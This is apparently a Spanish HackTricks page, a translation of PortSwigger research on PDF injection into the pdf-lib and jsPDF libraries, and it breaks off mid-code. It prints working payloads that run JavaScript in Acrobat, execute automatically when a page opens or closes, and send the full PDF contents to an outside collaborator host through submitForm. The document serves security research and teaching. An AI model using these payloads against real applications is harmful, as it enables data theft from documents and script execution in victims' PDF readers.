<details>

<summary><strong>Aprende a hackear AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al grupo de** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


**Si tu entrada est√° siendo reflejada dentro de un archivo PDF, puedes intentar inyectar datos de PDF para ejecutar JavaScript o robar el contenido del PDF.**

La siguiente informaci√≥n fue tomada de [**https://portswigger.net/research/portable-data-exfiltration**](https://portswigger.net/research/portable-data-exfiltration)

## PDF-Lib

Esta vez, estaba utilizando [PDFLib](https://pdf-lib.js.org). Me tom√© un tiempo para usar la biblioteca para crear una anotaci√≥n y ver si pod√≠a inyectar un par√©ntesis de cierre en la URI de la anotaci√≥n - ¬°y funcion√≥! El c√≥digo vulnerable de muestra que utilic√© para generar el c√≥digo de la anotaci√≥n fue:

`...`  \
`A: {`\
`Type: 'Action',`\
`S: 'URI',`\
``URI: PDFString.of(`injection)`),``\
`}`\
`})`\
`...`

[C√≥digo completo:](https://github.com/PortSwigger/portable-data-exfiltration/blob/main/PDF-research-samples/pdf-lib/first-injection/test.js)

¬øC√≥mo supe que la inyecci√≥n fue exitosa? El PDF se renderizar√≠a correctamente a menos que inyectara un par√©ntesis de cierre. Esto demostr√≥ que el par√©ntesis de cierre estaba rompiendo el l√≠mite del texto y causando un c√≥digo PDF inv√°lido. Romper el PDF estuvo bien, pero necesitaba asegurarme de que pod√≠a ejecutar JavaScript, por supuesto. Mir√© el c√≥digo PDF renderizado y not√© que la salida estaba siendo codificada usando el filtro FlateDecode. Escrib√≠ un peque√±o script para desinflar el bloque y la salida de la secci√≥n de anotaci√≥n se ve√≠a as√≠:`<<`\
`/Type /Annot`\
`/Subtype /Link`\
`/Rect [ 50 746.89 320 711.89 ]`\
`/Border [ 0 0 2 ]`\
`/C [ 0 0 1 ]`\
`/A <<`\
`/Type /Action`\
`/S /URI`\
`/URI (injection))`\
`>>`\
`>>`

Como puedes ver claramente, la cadena de inyecci√≥n est√° cerrando el l√≠mite del texto con un par√©ntesis de cierre, lo que deja un par√©ntesis de cierre existente que hace que el PDF se renderice incorrectamente:

![Captura de pantalla mostrando un di√°logo de error al cargar el PDF](https://portswigger.net/cms/images/34/f4/3ed2-article-screenshot-showing-damaged-pdf.png)

Genial, as√≠ que pod√≠a romper la renderizaci√≥n del PDF, ¬øy ahora qu√©? Necesitaba idear una inyecci√≥n que llamara a alg√∫n JavaScript - el alert(1) de la inyecci√≥n de PDF.

Al igual que c√≥mo los vectores XSS dependen del an√°lisis del navegador, la explotabilidad de la inyecci√≥n de PDF puede depender del renderizador de PDF. Decid√≠ comenzar por apuntar a Acrobat porque pens√© que los vectores ten√≠an menos probabilidades de funcionar en Chrome. Dos cosas que not√©: 1) Pod√≠as inyectar acciones de anotaci√≥n adicionales y 2) si reparabas el par√©ntesis de cierre existente, entonces el PDF se renderizar√≠a. Despu√©s de algunos experimentos, se me ocurri√≥ una buena carga √∫til que inyectaba una acci√≥n de anotaci√≥n adicional, ejecutaba JavaScript y reparaba el par√©ntesis de cierre:`/blah)>>/A<</S/JavaScript/JS(app.alert(1);)/Type/Action>>/>>(`

Primero rompo el par√©ntesis, luego salgo del diccionario usando >> antes de comenzar un nuevo diccionario de anotaci√≥n. El /S/JavaScript hace que la anotaci√≥n se base en JavaScript y el /JS es donde se almacena el JavaScript. Dentro de los par√©ntesis est√° nuestro JavaScript real. Nota que no tienes que escapar los par√©ntesis si est√°n equilibrados. Finalmente, a√±ado el tipo de anotaci√≥n, termino el diccionario y reparo el par√©ntesis de cierre. Esto fue muy genial; pude crear una inyecci√≥n que ejecutaba JavaScript pero ¬øy qu√©, verdad? Puedes ejecutar JavaScript pero no tienes acceso al DOM, as√≠ que no puedes leer cookies. Luego James apareci√≥ y sugiri√≥ robar el contenido del PDF desde la inyecci√≥n. Comenc√© a buscar formas de obtener el contenido de un PDF. En Acrobat, descubr√≠ que puedes usar JavaScript para enviar formularios sin ninguna interacci√≥n del usuario. Mirando la especificaci√≥n de la API de JavaScript, fue bastante sencillo modificar la inyecci√≥n base y agregar algo de JavaScript que enviar√≠a todo el contenido del c√≥digo PDF a un servidor externo en una solicitud POST:`/blah)>>/A<</S/JavaScript/JS(app.alert(1);`\
`this.submitForm({`\
`cURL: 'https://your-id.burpcollaborator.net',cSubmitAs: 'PDF'}))`\
`/Type/Action>>/>>(`

La alerta no es necesaria; solo la agregu√© para probar que la inyecci√≥n estaba ejecutando JavaScript.

Luego, solo por diversi√≥n, mir√© c√≥mo robar el contenido del PDF sin usar JavaScript. De la especificaci√≥n de PDF, descubr√≠ que puedes usar una acci√≥n llamada SubmitForm. Utilic√© esto en el pasado cuando constru√≠ un PDF para una verificaci√≥n de escaneo en Burp Suite. Hace exactamente lo que el nombre implica. Tambi√©n tiene una entrada de Flags en el diccionario para controlar lo que se env√≠a. La clave del diccionario Flags acepta un solo valor entero, pero cada configuraci√≥n individual est√° controlada por un bit binario. Una buena manera de trabajar con estas configuraciones es usando los nuevos literales binarios en ES6. El literal binario debe tener 14 bits de longitud porque hay un total de 14 flags. En el siguiente ejemplo, todas las configuraciones est√°n desactivadas:`0b00000000000000`

Para establecer un flag, primero necesitas buscar su posici√≥n de bit (tabla 237 de la [especificaci√≥n de PDF](https://www.adobe.com/content/dam/acom/en/devnet/pdf/pdfs/PDF32000\_2008.pdf)). En este caso, queremos establecer el flag SubmitPDF. Como esto est√° controlado por el 9¬∫ bit, solo necesitas contar 9 bits desde la derecha:`0b00000100000000`

Si eval√∫as esto con JavaScript, esto resulta en el valor decimal 256. En otras palabras, establecer la entrada de Flags a 256 habilitar√° el flag SubmitPDF, lo que hace que el contenido del PDF se env√≠e al enviar el formulario. Todo lo que necesitamos hacer es usar la inyecci√≥n base que creamos anteriormente y modificarla para llamar a la acci√≥n SubmitForm en lugar de JavaScript:`/blah)>>/A<</S/SubmitForm/Flags 256/F(`\
`https://your-id.burpcollaborator.net)`\
`/Type/Action>>/>>(`

## sPDF

Luego apliqu√© mi metodolog√≠a a otra biblioteca de PDF - [jsPDF](https://parall.ax/products/jspdf) - y descubr√≠ que tambi√©n era vulnerable. Explotar esta biblioteca fue bastante divertido porque tienen una API que puede ejecutarse en el navegador y te permitir√° generar el PDF en tiempo real mientras escribes. Not√© que, al igual que la biblioteca PDP-Lib, olvidaron escapar los par√©ntesis dentro de las URLs de anotaci√≥n. Aqu√≠ la propiedad url era vulnerable:`doc.createAnnotation({bounds:`\
`{x:0,y:10,w:200,h:200},`\
``type:'link',url:`/input`});``\
`//vulnerable`

As√≠ que gener√© un PDF usando su API e inyect√© c√≥digo PDF en la propiedad url:

`var doc = new jsPDF();`\
`doc.text(20, 20, 'Hello world!');`\
`doc.addPage('a6','l');`\
`doc.createAnnotation({bounds:`\
`` {x:0,y:10,w:200,h:200},type:'link',url:` ``\
`/blah)>>/A<</S/JavaScript/JS(app.alert(1);)/Type/Action/F 0/(`\
`` `}); ``

Reduc√≠ el vector eliminando las entradas de tipo del diccionario y la entrada F innecesaria. Luego dej√© un par√©ntesis colgante que ser√≠a cerrado por el existente. Reducir el tama√±o de la inyecci√≥n es importante porque la aplicaci√≥n web a la que est√°s inyectando podr√≠a permitir solo una cantidad limitada de caracteres.`/blah)>>/A<</S/JavaScript/JS(app.alert(1)`

Luego descubr√≠ que era posible reducir a√∫n m√°s el vector. Acrobat permitir√≠a una entrada URI y una entrada JavaScript dentro de una sola acci√≥n de anotaci√≥n y ejecutar√≠a felizmente el JavaScript:`/)/S/JavaScript/JS(app.alert(1)`

Investigaciones adicionales revelaron que tambi√©n puedes inyectar m√∫ltiples anotaciones. Esto significa que en lugar de solo inyectar una acci√≥n, podr√≠as salir de la anotaci√≥n y definir tus propias coordenadas rect para elegir qu√© secci√≥n del documento ser√≠a clickeable. Usando esta t√©cnica, pude hacer que todo el documento fuera clickeable. `/) >> >>`\
`<</Type /Annot /Subtype /Link /Rect [0.00 813.54 566.93 -298.27] /Border [0 0`\
`0] /A <</S/SubmitForm/Flags 0/F(https://your-id.burpcollaborator.net`

## Ejecutando anotaciones sin interacci√≥n

Hasta ahora, los vectores que he demostrado requieren un clic para activar la acci√≥n de la anotaci√≥n. T√≠picamente, James hizo la pregunta "¬øPodemos ejecutar autom√°ticamente?". Revis√© la especificaci√≥n de PDF y not√© algunas caracter√≠sticas interesantes de las anotaciones:

"Las entradas **PV** y **PI** permiten una distinci√≥n entre p√°ginas que est√°n abiertas y p√°ginas que son visibles. En cualquier momento, solo una p√°gina se considera abierta en la aplicaci√≥n de visualizaci√≥n, mientras que m√°s de una p√°gina puede ser visible, dependiendo del dise√±o de p√°gina."

Podemos agregar la entrada PV al diccionario y la anotaci√≥n se disparar√° autom√°ticamente en Acrobat. ¬°No solo eso, sino que tambi√©n podemos ejecutar una carga √∫til autom√°ticamente cuando el documento PDF se cierra usando la entrada PC. Un atacante podr√≠a rastrearte cuando abres el PDF y lo cierras.

Aqu√≠ te mostramos c√≥mo ejecutar autom√°ticamente desde una anotaci√≥n:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/)``\
`>> >>`\
``<</Subtype /Screen /Rect [0 0 900 900] /AA <</PV <</S/JavaScript/JS(app.alert(1))>>/(`});``\
`doc.text(20, 20, 'Auto execute');`

Cuando cierras el PDF, esta anotaci√≥n se disparar√°:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/) >> >>``\
``<</Subtype /Screen /Rect [0 0 900 900] /AA <</PC <</S/JavaScript/JS(app.alert(1))>>/(`});``\
`doc.text(20, 20, 'Close me');`

## Chrome

He hablado mucho sobre Acrobat pero ¬øqu√© hay de PDFium (el lector de PDF de Chrome)? Chrome es complicado; la superficie de ataque es mucho m√°s peque√±a ya que su soporte de JavaScript es m√°s limitado que el de Acrobat. Lo primero que not√© fue que el JavaScript no se estaba ejecutando en las anotaciones en absoluto, por lo que mis pruebas de concepto no funcionaban. Para que los vectores funcionaran en Chrome, necesitaba al menos ejecutar JavaScript dentro de las anotaciones. Sin embargo, primero decid√≠ intentar sobrescribir una URL en una anotaci√≥n. Esto fue bastante f√°cil. Podr√≠a usar la inyecci√≥n base que se me ocurri√≥ antes y simplemente inyectar otra acci√≥n con una entrada URI que sobrescribir√≠a la URL existente:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/blah)>>/A<</S/URI/URI(https://portswigger.net)``\
``/Type/Action>>/F 0>>(`});``\
`doc.text(20, 20, 'Test text');`

Esto navegar√≠a a portswigger.net cuando se hiciera clic. Luego continu√© e intent√© diferentes inyecciones para llamar a JavaScript, pero esto fallar√≠a cada vez. Pens√© que era imposible hacerlo. Di un paso atr√°s e intent√© construir manualmente un PDF completo que llamar√≠a a JavaScript desde un clic en Chrome sin una inyecci√≥n. Cuando se usaba un bot√≥n AcroForm, Chrome permitir√≠a la ejecuci√≥n de JavaScript, pero el problema era que requer√≠a referencias a partes del PDF. Logr√© crear una inyecci√≥n que ejecutar√≠a JavaScript desde un clic en JSPDF:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:200,h:200},type:'link',url:`/) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0.825 0.8275 0.8275]/CA(Submit)>>/Rect [ 72 697.8898 144 676.2897]/Subtype/Widget/AP<</N <</Type/XObject/BBox[ 0 0 72 21.6]/Subtype/Form>>>>/Parent <</Kids[ 3 0 R]/Ff 65536/FT/Btn/T(test)>>/H/P/A<</S/JavaScript/JS(app.alert(1))/Type/Action/F 4/DA(blah`});``\
`doc.text(20, 20, 'Click me test');`

Como puedes ver, el vector anterior requiere conocimiento de la estructura del PDF. \[ 3 0 R] se refiere a un objeto PDF espec√≠fico y si estuvi√©ramos haciendo un ataque de inyecci√≥n de PDF a ciegas, no conocer√≠amos la estructura de este. A√∫n as√≠, la siguiente etapa es intentar una presentaci√≥n de formulario. Podemos usar la funci√≥n submitForm para esto, y debido a que la anotaci√≥n requiere un clic, Chrome lo permitir√°:`/) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0.0 813.54 566.93 -298.27]/CA(Submit)>>/Rect [ 72 697.8898 144 676.2897]/Subtype/Widget/AP<</N <</Type/XObject/BBox[ 0 0 72 21.6]/Subtype/Form>>>>/Parent <</Kids[ 3 0 R]/Ff 65536/FT/Btn/T(test)>>/H/P/A<</S/JavaScript/JS(app.alert(1);this.submitForm('https://your-id.burpcollaborator.net'))/Type/Action/F 4/DA(blah`

Esto funciona, pero es desordenado y requiere conocimiento de la estructura del PDF. Podemos reducirlo mucho y eliminar la dependencia de la estructura del PDF:`#) >> >> <</BS<</S/B/W 0>>/Type/Annot/MK<</BG[ 0 0 889 792]/CA(Submit)>>/Rect [ 0 0 889 792]/Subtype/Widget/AP<</N <</Type/XObject/Subtype/Form>>>>/Parent <</Kids[ ]/Ff 65536/FT/Btn/T(test)>>/H/P/A<</S/JavaScript/JS(`\
`app.alert(1)`\
`)/Type/Action/F 4/DA(blah`\
``

Todav√≠a hay algo de c√≥digo que podemos eliminar:`var doc = new jsPDF();`\
``doc.createAnnotation({bounds:{x:0,y:10,w:
